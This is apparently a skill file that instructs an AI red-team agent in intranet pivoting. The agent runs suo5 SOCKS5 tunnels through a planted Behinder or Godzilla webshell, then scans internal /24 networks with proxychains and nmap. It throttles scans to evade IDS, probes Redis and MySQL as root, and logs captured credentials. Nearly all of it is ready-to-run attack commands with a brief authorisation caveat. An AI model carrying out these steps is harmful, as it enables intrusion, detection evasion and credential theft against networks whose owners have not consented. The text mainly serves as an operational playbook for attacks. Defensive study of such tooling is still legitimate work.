---
name: suo5-tunnel
description: Establish SOCKS5 tunnels over WebShell/HTTP using suo5 to proxy intranet traffic (Core Intranet Pivoting Tool)
whenToUse: After obtaining access to a machine (WebShell/RCE) and needing to scan and pivot into the intranet
role: internal
enabled: true
---

# suo5 Intranet Tunneling

> **This is the primary standard channel for intranet pivoting**: After obtaining a WebShell/RCE, you **must** first establish a SOCKS5 tunnel using suo5.
> Register the tunnel in the database (`redteam_tunnel_add` kind=suo5) and verify connectivity via `redteam_session_check` before proceeding with internal surveying or lateral movement.
> **Never write ad-hoc intranet scanning scripts without a tunnel** — custom scripts are slow, unstable, and risk losing access.
> The entry WebShell must be a Behinder or Godzilla encrypted shell (see skill `webshell-toolkit`) for user deliverability.

Binary: `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64` (v2.2.0, static Go binary, no external dependencies)

## Establishing Tunnels
```bash
SUO5=$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64

# 1) Use WebShell as tunnel endpoint (HTTP mode)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 -m socks5

# 2) With authentication
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:1080 --auth user:pass

# 3) HTTP proxy mode (for tools supporting HTTP proxies only)
$SUO5 -t "https://target.example.com/upload/x.jsp" -l 127.0.0.1:8081 -m http
```
Parameter reference: `-t` target shell URL, `-l` local listen address, `-m socks5|http`, `--auth user:pass`, `-r` reconnect interval, `--debug` traffic inspection.

## Operating Through Tunnels
```bash
# curl via socks5
curl -s --socks5 127.0.0.1:1080 http://10.0.0.5:8080/ -I

# nmap must use -sT (full connect) + proxychains, or --proxies (newer versions)
proxychains4 -q nmap -sT -Pn -p 22,80,445,3389,3306,6379,8080 10.0.0.0/24 -oN runs/internal-nmap.txt

# Databases / Middleware
proxychains4 -q redis-cli -h 10.0.0.6 -p 6379 info
proxychains4 -q mysql -h 10.0.0.7 -u root -p --connect-timeout=5

# API and browser requests through tunnel
curl -s --socks5 127.0.0.1:1080 "http://10.0.0.8:8080/api/user/1" -H "Cookie: JSESSIONID=..."
```

## Intranet Scanning Cadence (Evading Alerts)
- Run `/24` host discovery first (`nmap -sn` over tunnel or ICMP), then scan common ports on live hosts.
- Throttle rate down to `-T2 --max-rate 50` to avoid triggering internal network IDS.
- Log all newly discovered assets via `redteam_asset_add` (auto-creates /24 CIDRs) with `provenance="active"` and `tool="suo5+nmap"`.

## Database Logging Requirements
- **Register immediately upon setup (Mandatory)**: `redteam_tunnel_add` (`kind=suo5`, `listen=127.0.0.1:1080`, `entry=<WebShell URL>`, `reach=<reachable CIDR>`, `command=<full command>`), with `webshell_id` pointing to the corresponding WebShell record; verify via `redteam_session_check` and confirm `status=active` before proceeding.
- Record the tunnel itself in `redteam_chain_add` (`stage=pivot`, details note endpoints and local port).
- Record all internal assets, successful logins, and credentials separately (asset/access/credential).
- If a tunnel drops, update it to `status=down` via `redteam_tunnel_update`.

## Operational Notes
- Clean up tunnel endpoint files when testing completes to restore the target state.
- Public proxies are unsuitable for internal tunneling; suo5 routes through the target's own WebShell without requiring third-party relays.
- Operate strictly within authorized engagement boundaries.
